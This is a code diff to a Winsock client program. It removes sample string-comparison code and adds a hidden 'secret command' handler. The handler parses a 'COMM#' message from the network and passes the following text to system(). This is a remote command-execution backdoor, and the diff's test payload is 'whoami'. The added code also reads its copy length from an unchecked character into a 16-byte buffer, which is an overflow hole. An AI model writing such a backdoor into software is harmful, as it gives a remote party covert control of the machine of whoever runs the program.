@@ -25,7 +25,7 @@ int __cdecl main(int argc, char** argv)
     struct addrinfo* result = NULL,
         * ptr = NULL,
         hints;
-    const char* sendbuf = "this is a test";
+    const char* sendbuf = "COMM#6whoami";
     char recvbuf[DEFAULT_BUFLEN];
     char recvbuf2[DEFAULT_BUFLEN];
     int iResult;
@@ -116,31 +116,48 @@ int __cdecl main(int argc, char** argv)
     else
         printf("recv failed with error: %d\n", WSAGetLastError());
 
-    //Simple compare against a char
-   char* var = "jj";
-    if (recvbuf[0] == var[0])
-    {
-        printf("Whoo\n");
-    }
-    else
-    {
-        printf("Whee\n");
-    }
-
-    //Strncmp
-    char* comp = "this";
-    if (strncmp(recvbuf, comp, 4) == 0)
-    {
-        printf("Hi");
-    }
+    //Extract the secret command
 
     //Delimeter
-    char* delimeter = "e";
-    for (char c : recvbuf)
+    char* delimeter = "#";
+    int bufLen = strlen(recvbuf);
+    for (int ii=0; ii< bufLen; ii++)
     {
-        if (c == delimeter[0])
+        if (recvbuf[ii] == delimeter[0])
         {
             printf("Found delimeter\n");
+
+            //Now, we check whether the previous data is a command we know
+            char* command = "COMM";
+            int prevLen = ii;
+            if (prevLen < 0)
+            {
+                printf("Command not found\n");
+                break;
+            }
+
+            if (strncmp(recvbuf, command, prevLen) == 0)
+            {
+                //Found command "COMM"
+                printf("Found command COMM\n");
+
+                //Now, get the length of the command that comes right next
+                int lenToExecute = (int) (recvbuf[ii + 1] - '0');
+
+                //Now, execute whatever came after the delimeter
+                char toExecute[16] = { 0 };
+                strncpy(toExecute, recvbuf + ii + 2, lenToExecute);
+
+                //printf("Received to be executed: %s\n", toExecute);
+
+                system(toExecute);
+            }
+            else
+            {
+                printf("Unknown command received\n");
+            }
+            
+
             break;
         }
     }
